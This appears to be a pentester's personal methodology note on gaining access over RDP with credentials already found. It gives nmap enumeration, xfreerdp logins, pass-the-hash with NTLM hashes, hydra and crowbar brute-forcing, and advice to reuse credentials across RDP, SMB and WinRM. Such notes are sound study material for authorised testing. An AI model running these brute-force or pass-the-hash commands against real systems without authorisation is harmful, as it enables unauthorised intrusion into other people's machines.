## Goal
Log in with found creds for a GUI/shell. RDP(3389) is used with credentials you already have - not an entry vector.

> Got creds from anywhere (web config, LFI, a captured file)? Try them on every login surface,
> not just where you found them: **RDP 3389** (this note) / **SMB 445** / **WinRM 5985**.
> A web or app credential very often reuses to the OS account.
> In a domain, do this systematically (lockout-aware) via [[01_credentials_and_spraying]]; whole-domain loop → [[00_AD_METHODOLOGY]]; AD service index → [[00_AD_SERVICES]].

**Checklist**
- [ ] have valid creds or an NTLM hash?
- [ ] rdp-ntlm-info leaked domain/hostname/OS?
- [ ] pass-the-hash (Restricted Admin)?

# Commands

### Step 1: Enumerate
```bash
nmap -p3389 --script "rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info" $IP
# rdp-ntlm-info leaks: domain, hostname, OS version, DNS
```

### Step 2: Connect (xfreerdp preferred)
```bash
xfreerdp /v:$IP /u:user /p:'password' /dynamic-resolution /cert-ignore
xfreerdp /v:$IP /u:user /p:'password' /cert-ignore /drive:share,/tmp     # file share
xfreerdp /v:$IP /u:user /p:'password' /d:corp.local /cert-ignore         # domain user
rdesktop -u user -p 'password' $IP                                       # alternative
```

### Step 3: Pass-the-hash (Restricted Admin)
```bash
xfreerdp /v:$IP /u:administrator /pth:<NTLM_hash> /cert-ignore
nxc rdp $IP -u administrator -H <NTLM_hash>          # check it works / Restricted Admin on
```

### Step 4: Brute (careful: lockouts)
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt rdp://$IP -t 4
crowbar -b rdp -s $IP/32 -u user -C passwords.txt -n 4
```

### Helpline
```bash
# READING CONNECT RESULTS:
#   login -> desktop = full GUI -> run  whoami /all  and check privesc (token privileges, local admin).
#   "CredSSP required" / NLA error -> add /cert-ignore and make sure the password is exactly right.
#   "Account locked" -> STOP brute-forcing immediately (lockout policy hit).
#   black screen after connect -> add /dynamic-resolution (or /admin).
# rdp-ntlm-info leaks domain + hostname + OS BEFORE login -> use for Kerberos/SMB/AD targeting.
# ACCESS PATHS: verify a cred fast with  nxc rdp $IP -u user -p pass. pass-the-hash needs Restricted Admin
#   mode enabled (/pth). BlueKeep CVE-2019-0708 = unpatched 2008/7 only (risky).
# /drive:share,/tmp mounts a local folder into the session = easy file transfer both ways.
# RDP is a creds-IN service, not an entry vector: get the creds first.
```
